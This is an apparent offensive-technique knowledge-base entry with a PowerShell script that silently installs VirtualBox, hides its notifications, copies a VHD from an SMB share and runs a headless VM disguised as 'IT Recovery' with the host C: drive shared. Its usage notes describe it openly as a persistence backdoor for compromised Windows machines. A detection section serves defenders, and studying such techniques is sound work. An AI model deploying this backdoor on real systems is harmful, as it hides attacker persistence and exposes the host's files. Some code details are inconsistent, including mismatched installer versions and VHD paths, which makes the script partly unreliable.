---
id: 44ed30f5-5eaf-4b1d-8401-31e310114b41
name: PowerShell-Automate-VirtualBox-VM-Setup-for-Persistence
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:28.298597+00:00'
updated_at: '2024-01-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - persistence
  - virtualization
  - automation
validated: true
---

# PowerShell-Automate-VirtualBox-VM-Setup-for-Persistence

## Code

```ps1
# download virtualbox
Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe

# perform a silent install and avoid creating desktop and quick launch icons
VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0

# in \Program Files\Oracle\VirtualBox\VBoxManage.exe
# Disabling notifications
.\VBoxManage.exe setextradata global GUI/SuppressMessages "all" 

# Download the Virtual machine disk
Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd

# Create a new VM
$vmname = "IT Recovery"
.\VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register

# Add a network card in NAT mode
.\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit
.\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
.\VBoxManage.exe modifyvm $vmname --nic1 nat
.\VBoxManage.exe modifyvm $vmname --audio none
.\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
.\VBoxManage.exe modifyvm $vmname --description "Shadowbunny"

# Mount the VHD file
.\VBoxManage.exe storagectl $vmname -name "SATA Controller" -add sata
.\VBoxManage.exe storageattach $vmname -comment "Shadowbunny Disk" -storagectl "SATA Controller" -type hdd -medium "$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd" -port 0

# Start the VM
.\VBoxManage.exe startvm $vmname –type headless 


# optional - adding a shared folder
# require: VirtualBox Guest Additions
.\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\ -automount
# then mount the folder in the VM
sudo mkdir /mnt/c
sudo mount -t vboxsf shadow_c /mnt/c
```

## Description

This PowerShell script automates the download, silent installation, and configuration of VirtualBox on a Windows host, followed by creating a VM, attaching a VHD disk, and starting it headless. It is designed for establishing persistence by running a pre-configured VM with autostart malicious code, though note some hardcoded paths and OS type (Ubuntu in code, adaptable for Windows).

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $vmname | Name of the VM to create | "IT Recovery" |
| VHD source path | SMB path to the persistent VHD file | \\smbserver\images\shadowbunny.vhd |
| VHD destination path | Local path for copied VHD | $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd |
| VirtualBox download URL | Source for installer (version-specific) | https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe |

## Usage

Execute this script with administrative privileges on a compromised Windows machine to quickly set up a persistent VM backdoor. Customize variables like $vmname, SMB paths, and --ostype for Windows guests before running. Monitor for completion and verify VM status with VBoxManage list vms.

## Detection

- PowerShell execution logs showing Invoke-WebRequest to virtualbox.org or Copy-Item from SMB shares.
- File creation of VirtualBox installer in %TEMP% and VHD in user directories.
- VBoxManage.exe processes configuring and starting VMs.
- Anomalous network traffic to SMB servers or headless VM processes (VBoxHeadless.exe).
- EDR alerts on virtualization tool installations or VM artifacts in unexpected locations.

## Related

- [[procedures/Windows-VM-Persistence-with-VirtualBox-and-VHD]]
- [[tools/VirtualBox]]
